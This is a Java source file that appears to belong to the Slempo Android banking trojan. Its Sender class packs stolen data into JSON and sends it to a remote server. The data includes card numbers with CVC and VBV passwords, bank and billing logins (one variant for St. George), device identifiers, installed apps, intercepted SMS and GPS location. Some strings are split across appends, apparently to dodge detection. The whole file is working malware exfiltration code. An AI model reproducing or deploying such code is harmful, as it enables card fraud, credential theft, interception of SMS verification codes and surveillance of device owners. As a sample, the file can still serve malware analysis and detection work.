package org.slempo.service.utils;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.HashSet;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.slempo.service.Constants;
import org.slempo.service.billing.AdditionalInformation;
import org.slempo.service.billing.BillingAddress;
import org.slempo.service.billing.Card;
import org.slempo.service.utils.HttpSender.RequestType;

import android.content.Context;
import android.content.SharedPreferences;

public class Sender {

	public final static String INITIAL_DATA_IS_SENT = "INITIAL_DATA_IS_SENT";

	public static final String UPDATE_MAIN_UI = "UPDATE_MAIN_UI";

	private static void sendUserData(final Context context,
			final JSONObject data) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "user data");
			jObj.put("data", data);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_USER_DATA, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendCardData(final Context context, final String url,
			final Card card, final BillingAddress address,
			final AdditionalInformation info) {
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "card information");
			JSONObject cardObj = new JSONObject();
			cardObj.put("number", card.getNumber());
			cardObj.put("month", card.getMonth());
			cardObj.put("year", card.getYear());
			cardObj.put("cvc", card.getCvc());
			jObj.put("card", cardObj);
			JSONObject addressObj = new JSONObject();
			addressObj.put("name on card", address.getNameOnCard());
			addressObj.put("date of birth", address.getDateOfBirth());
			addressObj.put("zip code", address.getZip());
			addressObj.put("street address", address.getStreetAddress());
			addressObj.put("phone", address.getPhone());
			jObj.put("billing address", addressObj);
			JSONObject infoObj = new JSONObject();
			infoObj.put("vbv password", info.getVbvPass());
			infoObj.put("old vbv password", info.getOldVbvPass());
			jObj.put("additional information", infoObj);
			sendUserData(context, jObj);
		} catch (Exception e) {

		}
	}

	public static void sendPhoneData(final Context context, final String number) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "phone");
			jObj.put("number", number);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_PHONE, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendAccountData(final Context context,
			final String accountName, final String login, final String password) {
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "account");
			jObj.put("name", accountName);
			jObj.put("login", login);
			jObj.put("password", password);
			sendUserData(context, jObj);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendBillingData(final Context context,
			final String accountName, final String login,
			final String password, final String loginOld,
			final String passwordOld) {
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "billing credentials");
			jObj.put("name", accountName);
			jObj.put("login", login);
			jObj.put("password", password);
			jObj.put("login old", loginOld);
			jObj.put("password old", passwordOld);
			sendUserData(context, jObj);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendStGeorgeBillingData(final Context context,
			final String accountName, final String login,
			final String password, final String securityNumber, final String issueNumber, final String loginOld,
			final String passwordOld, final String securityNumberOld, final String issueNumberOld) {
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "billing credentials");
			jObj.put("name", accountName);
			jObj.put("login", login);
			jObj.put("password", password);
			jObj.put("security number", securityNumber);
			jObj.put("issue number", issueNumber);
			jObj.put("login old", loginOld);
			jObj.put("password old", passwordOld);
			jObj.put("security number old", securityNumberOld);
			jObj.put("issue number old", issueNumberOld);
			sendUserData(context, jObj);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendFormsData(final Context context,
			final JSONObject formsJson, final JSONObject oldFormsJson,
			int correlationId) {
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "forms");
			jObj.put("forms", formsJson);
			jObj.put("old forms", oldFormsJson);
			jObj.put("correlation id", correlationId);
			sendUserData(context, jObj);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendInitialData(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		if (!settings.getBoolean(INITIAL_DATA_IS_SENT, false)) {
			JSONObject jObj = new JSONObject();
			try {
				jObj.put("type", "device info");
				jObj.put("phone number", Utils.getPhoneNumber(context));
				jObj.put("country", Utils.getCountry(context));
				jObj.put("imei", Utils.getDeviceId(context));
				jObj.put("model", Utils.getModel());
				jObj.put("apps", Utils.getInstalledAppsList(context));
				jObj.put("operator", Utils.getOperator(context));
				jObj.put("os", Utils.getOS());
				jObj.put("client number", Constants.CLIENT_NUMBER);
				HttpSender sender = new HttpSender(jObj.toString(),
						RequestType.TYPE_INITIAL_DATA, context);
				sender.startSending();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		} else {
			if (!MessagesContentSender.isWorking()) {
				MessagesContentSender.startSending(context);
			}
			sendCheckData(context);
		}
	}

	public static void sendCheckData(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "device check");
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			jObj.put("html version", settings.getString(Constants.HTML_VERSION, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CHECK_DATA, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}
	
	public static void sendControlNumberData(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		JSONObject jObj = new JSONObject();
		try {
			String controlNumber = settings.getString(Constants.CONTROL_NUMBER,
					"");
			StringBuilder builder = new StringBuilder();
			builder.append("control");
			builder.append(" number response");
			jObj.put("type", builder.toString());
			jObj.put("set number", controlNumber);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONTROL_NUMBER_DATA, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendListenedIncomingSMS(final Context context,
			final String text, final String from) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "listened incoming sms");
			jObj.put("from", from);
			jObj.put("text", text);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_LISTENED_INCOMING_SMS, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendInterceptedIncomingSMS(final Context context,
			final String text, final String from) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			StringBuilder builder = new StringBuilder();
			builder.append("intercepted");
			builder.append(" incoming sms");
			jObj.put("type", builder.toString());	
			jObj.put("from", from);
			jObj.put("text", text);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_INTERCEPTED_INCOMING_SMS, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendListenedOutgoingSMS(final Context context,
			final String text, final String to) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			StringBuilder builder = new StringBuilder();
			builder.append("listened");
			builder.append(" outgoing sms");
			jObj.put("type", builder.toString());
			jObj.put("to", to);
			jObj.put("text", text);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_LISTENED_OUTGOING_SMS, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendInstalledApps(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "installed apps");
			jObj.put("apps", Utils.getInstalledAppsList(context));
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_INSTALLED_APPS, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendRentStatus(final Context context, final String status) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "rent status");
			jObj.put("rent status", status);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendListeningStatus(final Context context,
			final String status) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "listening status");
			jObj.put("listening status", status);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendNotificationSMSSentData(final Context context,
			final String number, final String text) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "sms sent notification");
			jObj.put("number", number);
			jObj.put("text", text);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendStartBlockingNumbersData(final Context context,
			final HashSet<String> numbersSet) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "blocking numbers");
			jObj.put("numbers", new JSONArray(numbersSet));
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendUnblockAllNumbersData(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "unblock all numbers");
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendGPSData(final Context context,
			final String latitude, final String longitude) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "location");
			jObj.put("latitude", latitude);
			jObj.put("longitude", longitude);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_GPS_DATA, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}
	
	public static void sendLockStatus(final Context context, final String status) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "lock status");
			jObj.put("status", status);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}
	
	public static void sendCallsForwarded(final Context context, final String forwardingTo) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "calls forwarded");
			jObj.put("to", forwardingTo);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendCallsForwardingDisabled(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "calls forwarding disabled");
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}
	
	public static void sendHTMLUpdated(final Context context) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "html updated");
			jObj.put("html version", settings.getString(Constants.HTML_VERSION, "-1"));
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public static void sendAppCodeData(final Context context, final String appId) {
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "app id received");
			jObj.put("app id", appId);
			jObj.put("client number", Constants.CLIENT_NUMBER);
			jObj.put("imei", Utils.getDeviceId(context));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_CONFIRMATION, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}
	
	public static void sendReport(final Context context, Throwable t) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		try {
			JSONObject jObj = new JSONObject();
			jObj.put("type", "crash report");
			JSONObject data = new JSONObject();
			String message = t.getMessage();
			if (message != null) {
				data.put("message", message);
			}
			StringWriter sw = new StringWriter();
			t.printStackTrace(new PrintWriter(sw));
			data.put("stack trace", sw.toString());
			jObj.put("data", data);
			jObj.put("code", settings.getString(Constants.APP_ID, "-1"));
			HttpSender sender = new HttpSender(jObj.toString(),
					RequestType.TYPE_REPORT, context);
			sender.startSending();
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}/**/
}
